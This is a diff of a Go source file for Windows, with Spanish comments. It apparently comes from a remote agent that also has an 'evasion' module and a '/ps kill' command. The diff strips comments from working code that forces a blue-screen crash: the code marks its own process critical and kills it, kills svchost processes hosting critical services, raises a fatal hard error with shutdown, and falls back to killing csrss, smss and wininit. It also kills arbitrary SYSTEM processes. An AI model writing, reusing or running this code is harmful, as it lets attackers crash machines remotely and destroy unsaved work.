@@ -14,25 +14,6 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-// Un bugcheck desde user mode tiene tres caminos y solo uno es fiable en
-// Windows moderno.
-//
-// Matar csrss, smss o wininit ya no sirve: desde Vista corren como procesos
-// protegidos (PPL, firmante WinTcb-Light). Con SeDebugPrivilege activo el
-// handle de terminación se sigue denegando con ACCESS_DENIED, sin bandera que
-// lo evite. Por eso el error que veía el operador era "wininit.exe (pid 884):
-// Access is denied".
-//
-// Lo que sí funciona es terminar un svchost que Windows marca como crítico
-// (RpcSs y compañía). svchost no es PPL, así que el handle se abre; el proceso
-// lleva BreakOnTermination, así que el kernel responde con
-// CRITICAL_PROCESS_DIED (0xEF), que es el bugcheck pedido.
-//
-// El tercer camino, NtRaiseHardError con ResponseOptionShutdown, no toca otro
-// proceso pero exige SeShutdownPrivilege activo en el token. Sin activarlo
-// devuelve STATUS_PRIVILEGE_NOT_HELD (0xC0000061), que era el otro error del
-// informe. Se queda como respaldo porque produce 0xC0000420, no 0xEF.
-
 var (
 	procNtRaiseHardError        = ntdll.NewProc("NtRaiseHardError")
 	procNtSetInformationProcess = ntdll.NewProc("NtSetInformationProcess")
@@ -41,17 +22,10 @@ var (
 	procIsProcessCritical       = kernel32.NewProc("IsProcessCritical")
 )
 
-// ProcessBreakOnTermination: la clase de NtSetInformationProcess que pone la
-// bandera BreakOnTermination. Es la misma que usa RtlSetProcessIsCritical.
 const processBreakOnTermination = 29
 
-// bsodTrace recibe cada paso del disparo. El agente lo engancha al diario y el
-// probe a un archivo con Sync: cuando la máquina cae a mitad de la llamada, la
-// última línea escrita es el paso que la tumbó, porque el proceso que provoca
-// el bugcheck no puede informar de su propio resultado.
 var bsodTrace = func(string) {}
 
-// SetBSODTrace instala el receptor de trazas. Pasar nil lo deja mudo.
 func SetBSODTrace(fn func(string)) {
 	if fn == nil {
 		bsodTrace = func(string) {}
@@ -60,16 +34,12 @@ func SetBSODTrace(fn func(string)) {
 	bsodTrace = fn
 }
 
-// criticalProcesses son los procesos cuya muerte provocaba bugcheck en Windows
-// sin PPL. Hoy están protegidos; se listan para el respaldo final.
 var criticalProcesses = []string{
-	"csrss.exe",   // subsistema de cliente
-	"smss.exe",    // gestor de sesiones
-	"wininit.exe", // inicio de sesión 0
+	"csrss.exe",
+	"smss.exe",
+	"wininit.exe",
 }
 
-// criticalServices son servicios que Windows marca como críticos. El SCM da el
-// PID del svchost que los hospeda, y ese proceso no está protegido por PPL.
 var criticalServices = []string{
 	"RpcSs",
 	"RpcEptMapper",
@@ -81,63 +51,42 @@ var criticalServices = []string{
 }
 
 const (
-	// STATUS_ASSERTION_FAILURE: el kernel lo trata como fatal y hace bugcheck
-	// con este mismo código.
 	statusAssertionFailure = 0xC0000420
 
-	// ResponseOptionShutdown hace que el error duro apague el equipo en vez de
-	// quedarse esperando un clic que nadie va a dar.
 	responseOptionShutdown = 6
 
-	// SE_SHUTDOWN_PRIVILEGE en el orden fijo de ntdll.
 	seShutdownPrivilege = 19
 
-	// criticalExitWait es lo que se espera tras terminar un proceso crítico.
-	// Si el proceso lo era, el kernel hace bugcheck en milisegundos y esta
-	// espera no llega a terminar.
 	criticalExitWait = 1500 * time.Millisecond
 )
 
-// serviceHost es el proceso que hospeda un servicio del SCM.
 type serviceHost struct {
 	service string
 	pid     uint32
 }
 
-// TriggerBSOD provoca el bugcheck y devuelve el método que lo consiguió. La
-// llamada vuelve antes de que la máquina caiga: Windows tarda milisegundos.
 func TriggerBSOD() (string, error) {
 	bsodTrace("privilegio: activando SeDebugPrivilege")
 	if err := enablePrivilege("SeDebugPrivilege"); err != nil {
 		bsodTrace("privilegio: " + err.Error())
 	}
 
-	// El aviso en disco es lo que permite confirmar el resultado después del
-	// reinicio: el proceso que provoca el bugcheck no puede informar él mismo.
 	_ = MarkPendingBugcheck("proceso crítico → CRITICAL_PROCESS_DIED (0xEF)")
 
 	var problems []string
 
-	// 1. El propio proceso se marca crítico y se termina. Es el camino más
-	// corto al kernel y el único que no depende de terceros: no le importa qué
-	// servicio hospeda cada svchost, ni si Windows lo tiene protegido, ni si el
-	// SCM lo reinicia. El kernel ve salir un proceso con BreakOnTermination y
-	// responde con 0xEF en el mismo instante.
 	bsodTrace("autocrítico: marcando el proceso como crítico")
 	if err := killSelfAsCritical(); err != nil {
 		problems = append(problems, "autocrítico: "+err.Error())
 		bsodTrace("autocrítico: " + err.Error())
 	}
 
-	// 2. svchost que hospeda un servicio crítico.
 	bsodTrace("svchost: buscando proceso crítico")
 	if err := killCriticalHosts(); err != nil {
 		problems = append(problems, "proceso crítico: "+err.Error())
 		bsodTrace("svchost: " + err.Error())
 	}
 
-	// 3. Error duro con apagado. No pinta la pantalla azul: apaga el equipo de
-	// inmediato, que es lo que queda cuando los dos caminos anteriores fallan.
 	bsodTrace("NtRaiseHardError: disparando")
 	if err := raiseHardError(); err == nil {
 		return "NtRaiseHardError (0xC0000420)", nil
@@ -146,7 +95,6 @@ func TriggerBSOD() (string, error) {
 		bsodTrace("NtRaiseHardError: " + err.Error())
 	}
 
-	// 4. Respaldo para sistemas sin PPL.
 	for _, name := range criticalProcesses {
 		pids, err := pidsByName(name)
 		if err != nil || len(pids) == 0 {
@@ -161,21 +109,10 @@ func TriggerBSOD() (string, error) {
 		}
 	}
 
-	// Nada se terminó: no hubo bugcheck y el aviso no debe sobrevivir.
 	_ = ClearPendingBugcheck()
 	return "", errors.New(strings.Join(problems, "; "))
 }
 
-// killSelfAsCritical pone BreakOnTermination en este proceso y lo termina.
-//
-// Es el camino más fiable a un bugcheck real desde user mode: el kernel no
-// consulta firmas ni protecciones, solo ve salir un proceso crítico y responde
-// con CRITICAL_PROCESS_DIED (0xEF). Necesita SeDebugPrivilege, que el llamador
-// ya activó.
-//
-// Si TerminateProcess vuelve, la bandera no surtió efecto y se revierte: dejar
-// el agente marcado como crítico haría que cualquier muerte suya —un taskkill,
-// un antivirus, el watchdog— reiniciara la máquina sin avisar.
 func killSelfAsCritical() error {
 	previous, err := setProcessCritical(true)
 	if err != nil {
@@ -190,18 +127,12 @@ func killSelfAsCritical() error {
 		return fmt.Errorf("TerminateProcess: %w", err)
 	}
 
-	// Si TerminateProcess vuelve, el kernel no trató el proceso como crítico.
-	// Se revierte para no dejar al agente marcado: un proceso con
-	// BreakOnTermination que muera por cualquier otra causa —un taskkill, el
-	// watchdog, un antivirus— reiniciaría la máquina sin que nadie lo pida.
 	if _, revertErr := setProcessCritical(previous); revertErr != nil {
 		bsodTrace("autocrítico: NO se pudo revertir BreakOnTermination: " + revertErr.Error())
 	}
 	return errors.New("el kernel no aplicó BreakOnTermination")
 }
 
-// setProcessCritical escribe BreakOnTermination en el proceso actual y devuelve
-// el valor que tenía antes.
 func setProcessCritical(critical bool) (previous bool, err error) {
 	if err := procNtSetInformationProcess.Find(); err != nil {
 		return false, fmt.Errorf("NtSetInformationProcess: %w", err)
@@ -225,8 +156,6 @@ func setProcessCritical(critical bool) (previous bool, err error) {
 	return previous, nil
 }
 
-// criticalServiceHosts pregunta al SCM qué proceso hospeda cada servicio
-// crítico. Los servicios comparten svchost, así que se deduplica por PID.
 func criticalServiceHosts() ([]serviceHost, error) {
 	manager, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CONNECT)
 	if err != nil {
@@ -274,9 +203,6 @@ func criticalServiceHosts() ([]serviceHost, error) {
 	return hosts, nil
 }
 
-// killCriticalHosts termina el primer svchost crítico que acepte el handle.
-// Nunca vuelve si el bugcheck sale: la espera posterior queda a medias porque
-// la máquina ya está cayendo.
 func killCriticalHosts() error {
 	hosts, err := criticalServiceHosts()
 	if err != nil {
@@ -306,8 +232,6 @@ func killCriticalHosts() error {
 			continue
 		}
 
-		// Proceso crítico: el kernel hace bugcheck ahora y esta espera no
-		// termina. Si termina, el kernel sigue en pie y se prueba el siguiente.
 		time.Sleep(criticalExitWait)
 		last = fmt.Errorf("%s (pid %d) terminado sin bugcheck", host.service, host.pid)
 	}
@@ -318,8 +242,6 @@ func killCriticalHosts() error {
 	return last
 }
 
-// isProcessCritical pregunta al kernel si el proceso lleva BreakOnTermination.
-// Devuelve known=false si la API no existe (antes de Windows 8.1).
 func isProcessCritical(handle windows.Handle) (critical, known bool) {
 	if err := procIsProcessCritical.Find(); err != nil {
 		return false, false
@@ -332,8 +254,6 @@ func isProcessCritical(handle windows.Handle) (critical, known bool) {
 	return flag != 0, true
 }
 
-// raiseHardError lanza un error duro fatal con apagado. No abre el handle de
-// nadie: solo llama a ntdll con SeShutdownPrivilege activo de verdad.
 func raiseHardError() error {
 	if err := enablePrivilege("SeShutdownPrivilege"); err != nil {
 		return err
@@ -349,10 +269,6 @@ func raiseHardError() error {
 		return errors.New("SeShutdownPrivilege no quedó activo")
 	}
 
-	// RtlAdjustPrivilege trabaja sobre el token efectivo del hilo, que es el
-	// que mira el kernel. Es un refuerzo, no un requisito: el privilegio ya
-	// está activo en el token del proceso y comprobado arriba, así que un
-	// fallo aquí no debe impedir la llamada.
 	var previous uint32
 	procRtlAdjustPrivilege.Call(
 		uintptr(seShutdownPrivilege), 1, 0, uintptr(unsafe.Pointer(&previous)))
@@ -369,10 +285,6 @@ func raiseHardError() error {
 	return nil
 }
 
-// enablePrivilege activa un privilegio del token actual. AdjustTokenPrivileges
-// no falla cuando el privilegio no existe en el token: devuelve éxito y deja
-// ERROR_NOT_ALL_ASSIGNED en el último error. Sin comprobar el estado después,
-// el código cree que activó algo que nunca tuvo.
 func enablePrivilege(name string) error {
 	var token windows.Token
 	if err := windows.OpenProcessToken(windows.CurrentProcess(),
@@ -419,9 +331,6 @@ func enablePrivilege(name string) error {
 	return nil
 }
 
-// privilegeState dice si el privilegio existe en el token y si está activo.
-// Es la única prueba fiable: AdjustTokenPrivileges puede devolver éxito sin
-// haber activado nada.
 func privilegeState(name string) (present, enabled bool, err error) {
 	var token windows.Token
 	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token); err != nil {
@@ -457,7 +366,6 @@ func privilegeState(name string) (present, enabled bool, err error) {
 	return false, false, nil
 }
 
-// pidsByName devuelve todos los procesos con ese nombre de ejecutable.
 func pidsByName(name string) ([]uint32, error) {
 	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
 	if err != nil {
@@ -487,7 +395,6 @@ func pidsByName(name string) ([]uint32, error) {
 	return out, nil
 }
 
-// equalFoldUTF16 compara el nombre del proceso sin distinguir mayúsculas.
 func equalFoldUTF16(raw []uint16, want string) bool {
 	got := windows.UTF16ToString(raw)
 	if len(got) != len(want) {
@@ -509,8 +416,6 @@ func equalFoldUTF16(raw []uint16, want string) bool {
 	return true
 }
 
-// killProcess pide la terminación y devuelve el error, a diferencia del
-// terminateProcess de evasion.go que solo intenta y sigue.
 func killProcess(pid uint32) error {
 	handle, err := windows.OpenProcess(
 		windows.PROCESS_TERMINATE|windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
@@ -529,8 +434,6 @@ func killProcess(pid uint32) error {
 	return nil
 }
 
-// TerminatePID mata un proceso cualquiera con los privilegios ya activados.
-// Lo usa /ps kill para que matar un proceso de SYSTEM no falle por token.
 func TerminatePID(pid uint32) error {
 	_ = enablePrivilege("SeDebugPrivilege")
 	if pid == 0 {
@@ -539,10 +442,6 @@ func TerminatePID(pid uint32) error {
 	return killProcess(pid)
 }
 
-// BSODDiagnostics informa, desde el proceso que llama, si el bugcheck puede
-// ejecutarse. No termina nada: solo activa privilegios, abre handles y los
-// cierra. Es la comprobación que vale, porque corre con el token real del
-// agente y no con el de un test aparte.
 func BSODDiagnostics() string {
 	var report strings.Builder
 
@@ -620,8 +519,6 @@ func BSODDiagnostics() string {
 	return report.String()
 }
 
-// integrityLevel traduce el RID del SID obligatorio a la etiqueta que usa
-// Windows. Los valores son fijos y no dependen del idioma del sistema.
 func integrityLevel(token windows.Token) string {
 	var size uint32
 	_ = windows.GetTokenInformation(token, windows.TokenIntegrityLevel, nil, 0, &size)
